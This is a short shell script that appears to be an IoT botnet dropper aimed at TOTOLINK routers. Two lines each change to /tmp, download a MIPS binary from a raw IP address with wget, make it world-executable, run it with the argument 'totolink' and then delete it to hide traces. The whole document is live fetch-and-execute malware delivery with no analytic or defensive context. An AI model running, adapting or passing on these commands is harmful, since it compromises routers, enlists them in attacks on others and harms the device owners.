#!/bin/sh
cd /tmp;wget http://45.88.67.38/splmips; chmod 777 splmips;./splmips totolink;rm -rf splmips
cd /tmp;wget http://45.88.67.38/splmpsl; chmod 777 splmpsl;./splmpsl totolink;rm -rf splmpsl
